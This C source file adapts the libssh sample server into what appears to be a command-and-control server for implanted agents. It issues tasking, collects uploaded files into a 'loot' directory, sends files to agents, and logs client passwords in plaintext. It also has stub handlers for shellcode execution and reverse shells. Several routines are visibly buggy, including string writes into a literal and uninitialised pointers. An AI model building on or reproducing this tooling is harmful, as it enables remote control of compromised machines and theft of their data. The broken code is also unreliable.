/* This is a sample implementation of a libssh based SSH server */
/*
Copyright 2003-2009 Aris Adamantiadis
This file is part of the SSH Library
You are free to copy this file, modify it in any way, consider it being public
domain. This does not apply to the rest of the library though, but it is
allowed to cut-and-paste working code from this file to any license of
program.
The goal is to show the API in action. It's not a reference on how terminal
clients must be made or how a client should react.




https://github.com/substack/libssh
https://www.libssh.org/
http://api.libssh.org/stable/libssh_tutorial.html

*/

#include "agents.h"
#include "misc.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif

#ifndef KEYS_FOLDER
#ifdef _WIN32
#define KEYS_FOLDER
#else
#define KEYS_FOLDER "/etc/ssh/"
#endif
#endif

#ifdef WITH_PCAP
const char *pcap_file="debug.server.pcap";
ssh_pcap_file pcap;

void set_pcap(ssh_session session);
void set_pcap(ssh_session session){
	if(!pcap_file)
		return;
	pcap=ssh_pcap_file_new();
	if(ssh_pcap_file_open(pcap,pcap_file) == SSH_ERROR){
		printf("Error opening pcap file\n");
		ssh_pcap_file_free(pcap);
		pcap=NULL;
		return;
	}
	ssh_set_pcap_file(session,pcap);
}

void cleanup_pcap(void);
void cleanup_pcap(){
	ssh_pcap_file_free(pcap);
	pcap=NULL;
}
#endif

ssh_session session_array[MAX_CONN];
pthread_t thread_array[MAX_CONN];
pthread_mutex_t session_lock;


#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
  SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
  {
    .name  = "port",
    .key   = 'p',
    .arg   = "PORT",
    .flags = 0,
    .doc   = "Set the port to bind.",
    .group = 0
  },
  {
    .name  = "hostkey",
    .key   = 'k',
    .arg   = "FILE",
    .flags = 0,
    .doc   = "Set the host key.",
    .group = 0
  },
  {
    .name  = "dsakey",
    .key   = 'd',
    .arg   = "FILE",
    .flags = 0,
    .doc   = "Set the dsa key.",
    .group = 0
  },
  {
    .name  = "rsakey",
    .key   = 'r',
    .arg   = "FILE",
    .flags = 0,
    .doc   = "Set the rsa key.",
    .group = 0
  },
  {
    .name  = "verbose",
    .key   = 'v',
    .arg   = NULL,
    .flags = 0,
    .doc   = "Get verbose output.",
    .group = 0
  },
  {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
  ssh_bind sshbind = state->input;

  switch (key) {
    case 'p':
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
      break;
    case 'd':
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
      break;
    case 'k':
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
      break;
    case 'r':
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
      break;
    case 'v':
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
      break;
    case ARGP_KEY_ARG:
      if (state->arg_num >= 1) {
        /* Too many arguments. */
        argp_usage (state);
      }
      ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
      break;
    case ARGP_KEY_END:
      if (state->arg_num < 1) {
        /* Not enough arguments. */
        argp_usage (state);
      }
      break;
    default:
      return ARGP_ERR_UNKNOWN;
  }

  return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */



void agent_handler(struct clientDat agent){
    char resp[2048];
    char *ptr = &resp;

    int operation = -1;
    int quitting = 0;
    int size = 0;
    char buff[2048];
            
    while (!quitting)
    {
        ssh_channel_read(agent.chan, resp, sizeof(resp), 0);
        // this seems wrong...
        char tmpbf[3];
        strncat(tmpbf,resp,index_of(resp, '|', 0));
        operation = atoi(tmpbf);
        ptr += index_of(resp, '|', 0);

        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        switch (operation)
        {
        case AGENT_EXIT:
            pthread_mutex_lock(&session_lock);
            session_array[agent.id] = NULL;
            pthread_mutex_unlock(&session_lock);
            ssh_channel_close(agent.chan);
            ssh_free(agent.session);
            printf("Client %d: Client exiting...\n", agent.id); 
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
        /*ADD CHECKS IN HERE FOR SAFETY*/
            memset(buff, 0, sizeof(buff));
            ssh_channel_write(agent.chan, "fn", 3);
            ssh_channel_read(agent.chan, buff, sizeof(buff), 0);
            char *dat_ptr;

            // get filesize 
            size = get_file(buff, dat_ptr);
            if(size < 0){
                printf("Client %d: filename '%s' does not exist\n", agent.id, buff); 
                ssh_channel_write(agent.chan, "er", 3);
                break;
            }
            memset(buff, 0, sizeof(buff));
            
            // writes file size
            ssh_channel_write(agent.chan, &size, sizeof(size));
            ssh_channel_read(agent.chan, buff, sizeof(buff), 0);

            // writes file 
            ssh_channel_write(agent.chan, dat_ptr, size);

            break;

        case AGENT_UP_FILE:
            /*ADD CHECKS IN HERE FOR SAFETY*/
            
            // gets file name
            ssh_channel_write(agent.chan, "fn", 3);
            char filename[2048];
            ssh_channel_read(agent.chan, filename, sizeof(filename), 0);
            
            // get size and allocate memory segment
            ssh_channel_write(agent.chan, "ok", 3);
            ssh_channel_read(agent.chan, (char *) &size, 1, 0);
            char *data_ptr = malloc(size);
            memset(data_ptr, 0, size);
            
            // writes file size
            ssh_channel_write(agent.chan, "ok", 3);
            ssh_channel_read(agent.chan, buff, size, 0);

            // writes file 
            ssh_channel_write(agent.chan, "ok", 3);
            FILE *file;
            clean_input(filename);
            strcat("loot/", filename);
            file = fopen(filename, "wb");
            fwrite(data_ptr, 1, size, file);
            fclose(file);
            break;

        case AGENT_EXEC_SC:
            break;

        case AGENT_REV_SHELL:
            break;

        default:
            printf("Client %d: Unknown operation value '%d'\n", agent.id, operation); 
            ssh_channel_write(agent.chan, "un", 3);
            break;
        }
    }
}


void *ssh_handler(void* sess){
    struct clientDat pass = *(struct clientDat*) sess;

    ssh_message message;
    int sftp = 0;
    int i = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char agent_id[128];
    int resp;
        
    srand(time(NULL));
    pass.trans_id = rand();
    
    do {
		//printf("entered message loop\n");
        message=ssh_message_get(pass.session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
					printf("Client %d: Got request for opening channel\n", pass.id); 
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        pass.chan=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !pass.chan);
    
	if(!pass.chan){
        printf("Client %d: Channel error : %s\n", pass.id, ssh_get_error(pass.session));
        ssh_finalize();
        return NULL;
    }
    
	do {
		//printf("Entered second message loop\n");
        message=ssh_message_get(pass.session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
//            if(!strcmp(ssh_message_channel_request_subsystem(message),"sftp")){
				printf("Client %d: Got tasking request\n", pass.id);
                sftp=1;
                msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
 //           }
        }

		if (message && ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_EXEC){
			printf("Client %d: Got request for execution\n", pass.id);
            ssh_message_channel_request_reply_success(message);
            sftp=1;
            msgType = REQ_EXEC;
			break;
		}
		

        if(!sftp){
            ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (message && !sftp);
    
	if(!sftp){
		printf("Client %d: SFTP error : %s\n", pass.id, ssh_get_error(pass.session));
        return NULL;
    }
    //printf("it works !\n");
    
    switch (msgType)
    {
    case REQ_EXEC:
    /*
        Tasking goes like this:
            Client connects and requests tasking (through requesting a shell interface)
            Server retrieves client ID (precompiled?), and checks it against existing files
                if it doesnt have any existing files, then it will create one and return that there is nothing to do (0)
            
                If it does have stuff in the file, it will parse it and send it to the client in a parsable format.
                The client channel is then passed off to a secondary handler who will just help it complete the tasking
    
    */
        printf("Client %d: waiting for command\n", pass.id);
        printf("Client %d: wrote data to channel\n", pass.id);
        break;
    case REQ_TASKING:
        // Get agent ID
        //char agent_id[128];
        ssh_channel_read(pass.chan, agent_id, sizeof(agent_id), 0);
        printf("Client %d: got identifier: %s\n", pass.id, agent_id);

        // Check if ID exists
        memset(buf, 0, sizeof(buf));
        strcat(buf, "agents/");
        int exists = directory_exists(strcat(buf, agent_id));
        
        if(!exists){
            init_agent(agent_id);
            printf("Client %d: Initialized agent\n");
        }

        char tasking[2048];
        memset(tasking, 0, sizeof(tasking));
        get_tasking(agent_id, tasking);
        // Write tasking
        ssh_channel_write(pass.chan, tasking, strlen(tasking));
        
        // Pass to handler
        agent_handler(pass);
        
        break;
    default:
        printf("Client %d: got unknown message type: %d\n", pass.id, msgType);
        break;
    }

    printf("Client %d: closing channels...\n", pass.id);
    ssh_message_free(message);
    ssh_disconnect(pass.session);

	
    return NULL;
}

int get_free(){
    pthread_mutex_lock(&session_lock);
    for (size_t i = 0; i < MAX_CONN; i++)
    {
        if(session_array[i] == NULL){
            pthread_mutex_unlock(&session_lock);
            return i;
        }
    }
    pthread_mutex_unlock(&session_lock);
    return -1;
}

void handleTerm(int term){
    printf("Terminating...\n");
    int termTime = 10;
    int curr = 0;
    // Todo: clean up active connections from server.
    //pthread_mutex_lock(&session_lock);
    for (size_t i = 0; i < MAX_CONN; i++)
    {
        if(session_array[i] != NULL){
            printf("TERM: Found active connection at index %d\n", i);
            while(session_array[i] != NULL){
                if(termTime > curr){
                    printf("TERM: Waiting for connection to terminate (%d/%d sec)\n", curr, termTime);
                    sleep(1);
                    curr++;
                } else {
                    printf("TERM: Killing connection...\n");
                    ssh_free(session_array[i]);
                }
            }
        }
    }
    //pthread_mutex_unlock(&session_lock);
    exit(-1);

}


int main(int argc, char **argv){
    // set up signal handlers
    struct sigaction sigIntHandler;
	struct sigaction sigTermHandler;


	sigIntHandler.sa_handler = handleTerm;
   	sigemptyset(&sigIntHandler.sa_mask);
   	sigIntHandler.sa_flags = 0;

	sigTermHandler.sa_handler = handleTerm;
	sigemptyset(&sigTermHandler.sa_mask);
	sigTermHandler.sa_flags = 0;

   	sigaction(SIGINT, &sigIntHandler, NULL);
	sigaction(SIGTERM, &sigTermHandler, NULL);

    // initialize variables
    ssh_session session;
    ssh_bind sshbind;
    ssh_message message;
    ssh_channel chan=0;
    char buf[2048];
    int auth=0;
    int sftp=0;
    int i;
    int r;
    int opt = 1;
    int quitting = 0;
	int port=1337;
    int msgType = REQ_EXEC;
    int master_socket;
    int ctr = 0;
    pthread_t thread;

    init();
    
    for (size_t i = 0; i < MAX_CONN; i++)
    {
        session_array[i] = NULL;
    }
    

    struct sockaddr_in address;

    if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("socket failed");   
        exit(EXIT_FAILURE);   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("setsockopt");   
        exit(EXIT_FAILURE);   
    }



    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &master_socket);
	
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
    //ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT, &port);
	printf("Initialized Variables...\n");
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     */
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif
#ifdef WITH_PCAP
    set_pcap(session);
#endif

    // bind the listener to the port
    if(ssh_bind_listen(sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    printf("Server: Bound to listening port\n");
    
    // accept connections
    while (!quitting){
        ctr = get_free();
        if (ctr == -1) {
            printf("Server: Hit max concurrent connections. Waiting for free sessions...\n");
            sleep(10);
            ctr = get_free();
        
        } else {
            printf("Server: Found free session at index %d\n", ctr);
            session=ssh_new();

            r=ssh_bind_accept(sshbind,session);
	        printf("Server: Accepting connection\n");
            if(r==SSH_ERROR){
      	        printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
      	        return 1;
            }
            if (ssh_handle_key_exchange(session)) {
                printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
                return 1;
            }

            auth = 0;
            do {
                message=ssh_message_get(session);
                if(!message)
                    break;
                switch(ssh_message_type(message)){
                    case SSH_REQUEST_AUTH:
                        switch(ssh_message_subtype(message)){
                            case SSH_AUTH_METHOD_PASSWORD:
                                printf("Server: User %s wants to auth with pass %s\n", ssh_message_auth_user(message), ssh_message_auth_password(message));
                                if(auth_password(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                                    auth=1;
                                    ssh_message_auth_reply_success(message,0);
                                    break;
                           	    }
                            // not authenticated, send default message
                            case SSH_AUTH_METHOD_NONE:
                            default:
                                ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                                ssh_message_reply_default(message);
                                break;
                        }
                        break;
                    default:
                        ssh_message_reply_default(message);
                }
                ssh_message_free(message);
            } while (!auth);
    
            // Check if the client authenticated successfully
	        if(!auth){
                printf("auth error: %s\n",ssh_get_error(session));
                ssh_disconnect(session);
                break;
            }
            pthread_mutex_lock(&session_lock);
            session_array[ctr] = session;
            pthread_mutex_unlock(&session_lock);

            struct clientDat pass;
            pass.id = ctr;
            pass.session = session_array[ctr];
    
            // Pass the connection off to the handler
            if(pthread_create(&thread, NULL, ssh_handler, &pass)){
                printf("Error creating thread\n");
                ssh_disconnect(session);
                break;

            }

            printf("Server: Passed session to thread...\n");

            thread_array[ctr] = thread;	
        }
    }
        
        
    for (size_t i = 0; i < ctr; i++){
        if(pthread_join(thread_array[i], NULL)){
            printf("Failed to join thread at index %d\n", i);
        }
    }

    ssh_bind_free(sshbind);

#ifdef WITH_PCAP
    cleanup_pcap();
#endif
    ssh_finalize();

    return 0;
}
